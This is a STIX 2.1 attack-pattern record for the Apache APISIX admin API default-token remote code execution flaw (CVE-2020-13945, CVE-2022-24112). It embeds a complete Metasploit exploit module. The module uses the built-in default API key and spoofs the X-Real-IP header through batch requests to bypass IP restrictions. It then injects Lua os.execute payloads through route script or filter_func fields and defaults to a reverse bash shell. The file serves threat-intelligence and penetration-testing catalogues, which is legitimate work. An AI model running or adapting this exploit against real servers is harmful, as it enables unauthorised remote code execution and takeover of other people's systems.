{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--07179819-b6a9-4438-a738-782517c8ae0f",
    "created": "2024-08-14T17:11:10.369519Z",
    "modified": "2024-08-14T17:11:10.369523Z",
    "name": "APISIX Admin API default access token RCE",
    "description": " Apache APISIX has a default, built-in API token edd1c9f034335f136f87ad84b625c8f1 that can be used to access all of the admin API, which leads to remote LUA code execution through the script parameter added in the 2.x version. This module also leverages another vulnerability to bypass the IP restriction plugin. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/apache_apisix_api_default_token_rce.rb",
            "external_id": "apache_apisix_api_default_token_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-13945"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-24112"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/apache/apisix/pull/2244"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2020/q4/187"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2022/02/11/3"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'APISIX Admin API default access token RCE',\n        'Description' => %q{\n          Apache APISIX has a default, built-in API token edd1c9f034335f136f87ad84b625c8f1 that can be used to access\n          all of the admin API, which leads to remote LUA code execution through the script parameter added in the 2.x\n          version. This module also leverages another vulnerability to bypass the IP restriction plugin.\n        },\n        'Author' => [\n          'Heyder Andrade <eu[at]heyderandrade.org>', # module development and debugging\n          'YuanSheng Wang <membphis[at]gmail.com>' # discovered\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2020-13945'],\n          ['CVE', '2022-24112'],\n          ['URL', 'https://github.com/apache/apisix/pull/2244'],\n          ['URL', 'https://seclists.org/oss-sec/2020/q4/187'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2022/02/11/3']\n        ],\n        'DisclosureDate' => '2020-12-07',\n        'Arch' => ARCH_CMD,\n        'Platform' => %w[unix],\n        'Targets' => [\n          [\n            'Automatic', { 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' } }\n          ]\n        ],\n        'Privileged' => false,\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path to the APISIX DocumentRoot', '/apisix']),\n      OptString.new('API_KEY', [true, 'Admin API KEY (Default: edd1c9f034335f136f87ad84b625c8f1)', 'edd1c9f034335f136f87ad84b625c8f1']),\n      OptString.new('ALLOWED_IP', [true, 'IP in the allowed list', '127.0.0.1'])\n    ])\n  end\n\n  def check\n    print_status(\"Checking component version to #{datastore['RHOST']}:#{datastore['RPORT']}\")\n    # batch request is the preferred method because it bypass the ip-restriction plugin\n    res = nil\n    if batch_request_enabled?\n\n      pipeline = [\n        {\n          method: 'GET',\n          path: \"#{target_uri.path}/admin/routes\"\n        }\n      ]\n      res = batch_request(batch_body(pipeline))\n      vprint_good('Can perform authenticated requests through batch requests') if res && res.code == 200\n\n      pipeline = [\n        {\n          method: 'GET',\n          path: \"#{target_uri.path}/admin/routes/index\"\n        }\n      ]\n      res = batch_request(batch_body(pipeline))\n\n    else\n      vprint_error('The batch-requests plugin is not enabled')\n\n      vprint_good('There is direct access to the routes using the provided token') if direct_access?\n\n      res = apisix_request({\n        'uri' => normalize_uri(target_uri.path, Rex::Text.rand_text_alpha_lower(6)),\n        'method' => 'GET'\n      })\n\n    end\n    unless res && res.headers.key?('Server')\n      return Exploit::CheckCode::Unknown('Unable to determine which web server is running')\n    end\n\n    res.headers['Server'].match(%r{(.*)/([\\d|.]+)$})\n\n    server = Regexp.last_match(1) || nil\n    version = Rex::Version.new(Regexp.last_match(2)) || nil\n\n    if server && server.match(/APISIX/)\n      vprint_status(\"Found an #{server} #{version} http server header\")\n      return Exploit::CheckCode::Appears if version > Rex::Version.new('2')\n    end\n    return Exploit::CheckCode::Safe('A vulnerable version if APISIX server is not running')\n  end\n\n  def exploit\n    # batch request is the preferred method because it bypass the ip-restriction plugin\n    if batch_request_enabled?\n      @payload_uri = \"/#{Rex::Text.rand_text_alpha_lower(3)}/#{Rex::Text.rand_text_alpha_lower(6)}\"\n      filter_func_exec\n      # trigger the payload\n      apisix_request({\n        'uri' => normalize_uri(@payload_uri),\n        'method' => 'GET'\n      })\n    else\n      add_route\n    end\n    handler\n  end\n\n  def cleanup\n    return unless @payload_uri\n\n    data = {\n      'uri' => @payload_uri\n    }\n    pipeline = [\n      {\n        'path' => normalize_uri(target_uri.path, '/admin/routes/index'),\n        'method' => 'DELETE',\n        'body' => JSON.dump(data)\n      }\n    ]\n    vprint_status(\"Deleting route #{@payload_uri}\")\n    # remove the route\n    res = batch_request(batch_body(pipeline))\n    vprint_error('Unable to delete the route') unless res&.code == 200\n  end\n\n  def apisix_request(params = {})\n    params.merge!({\n      'ctype' => 'application/json',\n      'headers' => {\n        'X-API-KEY' => datastore['API_KEY'],\n        'Accept' => '*/*',\n        'Accept-Encoding' => 'gzip, deflate'\n      }\n    })\n\n    send_request_cgi(params)\n  end\n\n  # Using batch request to bypass ip-restriction policies (CVE-2022-24112)\n  def batch_request(data = nil)\n    params = {\n      'uri' => normalize_uri(target_uri.path, '/batch-requests'),\n      'method' => 'POST'\n    }\n    params.merge!({ 'data' => data }) if data\n\n    apisix_request(params)\n  end\n\n  def batch_body(pipeline = [])\n    headers = {\n      'X-Real-IP': datastore['ALLOWED_IP'].to_s,\n      'X-API-KEY' => datastore['API_KEY'].to_s,\n      'Content-Type' => 'application/json'\n    }\n\n    {\n      'headers' => headers,\n      'timeout' => 1500,\n      'pipeline' => pipeline\n    }.to_json\n  end\n\n  def base_data\n    {\n      'uri' => Rex::Text.rand_text_alpha_lower(6),\n      'upstream' => {\n        'type' => 'roundrobin',\n        'nodes' => { Faker::Internet.domain_name.to_s => 1 }\n      }\n    }\n  end\n\n  def add_route\n    # This method use the script parameter to execute the payload\n    stub = \"os.execute('#{payload.encoded.gsub(/(['\\\\])/, '\\\\\\\\\\\\1')}');\"\n    # binding.pry\n    data = base_data.merge({\n      'script' => stub\n    })\n    uri = normalize_uri(target_uri.path, '/admin/routes')\n    if batch_request_enabled?\n      pipeline = [\n        {\n          'method' => 'POST',\n          'path' => uri,\n          'body' => data\n        }\n      ]\n      batch_request(batch_body(pipeline))\n    else\n      params = {\n        'method' => 'POST',\n        'uri' => uri,\n        'data' => JSON.dump(data)\n      }\n      apisix_request(params)\n    end\n  end\n\n  def filter_func_exec\n    # This method use the filter_func parameter to execute the payload\n    stub = \"function(vars) os.execute('#{payload.encoded.gsub(/(['\\\\])/, '\\\\\\\\\\\\1')}'); return true end\"\n\n    data = base_data.merge({\n      'uri' => @payload_uri,\n      'name' => Rex::Text.rand_text_alpha_lower(6),\n      'filter_func' => stub\n    })\n    if batch_request_enabled?\n      pipeline = [\n        {\n          'path' => normalize_uri(target_uri.path, '/admin/routes/index'),\n          'method' => 'PUT',\n          'body' => JSON.dump(data)\n        }\n      ]\n      # add the route\n      res = batch_request(batch_body(pipeline))\n      vprint_error('Unable to create route') unless res.code == 200\n    else\n      params = {\n        'method' => 'PUT',\n        'uri' => normalize_uri(target_uri.path, '/admin/routes/index'),\n        'data' => JSON.dump(data)\n      }\n      apisix_request(params)\n    end\n  end\n\n  def direct_access?\n    res = apisix_request({\n      'uri' => normalize_uri(target_uri.path, '/admin/routes'),\n      'method' => 'GET'\n    })\n\n    return false if [401, 403].include?(res.code) || res.body.match?(/'ip-restriction'/)\n\n    true\n  end\n\n  def batch_request_enabled?\n    res = apisix_request({\n      'uri' => normalize_uri(target_uri.path, '/batch-requests'),\n      'method' => 'POST'\n    })\n\n    fail_with(Failure::Unreachable, 'Connection failed') if res.nil?\n    return false if res.code == 404\n\n    true\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-12-07",
    "x_mitre_platforms": [
        "%w[unix]"
    ]
}